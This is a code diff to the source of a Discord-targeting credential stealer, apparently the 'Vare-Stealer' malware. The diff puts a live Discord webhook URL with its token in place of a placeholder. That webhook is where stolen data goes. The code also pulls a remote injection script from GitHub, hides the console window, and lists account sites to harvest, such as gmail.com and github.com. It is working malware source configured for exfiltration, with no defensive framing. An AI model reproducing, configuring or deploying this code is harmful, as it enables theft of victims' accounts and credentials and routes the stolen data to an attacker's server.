@@ -13,10 +13,10 @@ const { execSync, exec } = require('child_process');
 const hideconsole = require('node-hide-console-window');
 const buf_replace = require('buffer-replace');
 
-let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
+let killdcop = false; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %webhookstring% = "https://discordapp.com/api/webhooks/1453830996347584702/PqHAGKqeLQVocjjJZEQo8UrZtNFLywMyFmyOZBROvN5afikX_OCE0DzC6LdWsSbHfNKk"
 const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
@@ -1437,6 +1437,7 @@ async function %VARECHECKSTART%() {
 
 
 %VARECHECKSTART%()
+
 
 
 process.on("uncaughtException", err => console.error(err)).on("unhandledRejection", err => console.error(err));
